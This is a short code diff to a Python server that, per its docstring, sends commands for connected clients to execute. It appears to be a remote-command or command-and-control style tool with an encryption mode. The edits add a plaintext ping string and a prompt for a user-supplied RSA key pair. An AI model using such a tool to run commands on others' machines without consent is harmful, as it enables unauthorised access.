@@ -125,8 +125,8 @@ The bytesize of the messages being sent between the server and client is 1024.
 
         # Variable to indicate if server is in encryption mode
         self.encryption_mode_flag: bool = False
-        self.private_key: bool | bytes = None # Variable storing the current server private key
-        self.public_key: bool | bytes = None # Variable storing the current server public key
+        self.private_key = None # Variable storing the current server private key
+        self.public_key = None # Variable storing the current server public key
 
         # Dictionary to hold clients key pairs for encrypted communication
         self.client_keys: Dict[socket.socket, Tuple[bytes,bytes]] = {} # {client:(private_key, public_key)}
@@ -282,6 +282,8 @@ The bytesize of the messages being sent between the server and client is 1024.
                 # Receive, decode, and decrypt the response
                 client_response: str = client.recv(self.bytesize).decode()
                 client_response: str = client_response.strip()
+                if client_response == 'P1NGS3RV3R': # Send 'P1NGS3RV3R' from client to server to test connection
+                    return None
                 decrypted_client_response: str = self.decrypt_response(client_response, client)
                 client_OS: str = self.client_list[client_ip][0][2]
                 
@@ -767,6 +769,13 @@ The bytesize of the messages being sent between the server and client is 1024.
         Choose a client you would like to access, and send commands to be executed by them
         '''
         print(Fore.LIGHTMAGENTA_EX+"\nEnter 'help' to show all available CLI commands ") 
+
+        # User can use their own 2048 bit RSA key pair
+        if input(Fore.GREEN+'Enter y if you would like to use your own RSA 2048 bit key pair (case sensitive): ') == 'y':
+            self.private_key = input('Enter your RSA 2048 bit private key:\n')
+            self.public_key = input('Enter your RSA 2048 bit public key:\n')
+            self.encryption_mode_flag = True
+            print(Fore.LIGHTMAGENTA_EX+'You are now in encryption mode')
 
         while True:
             # Ensure currently connected client is still connected to server
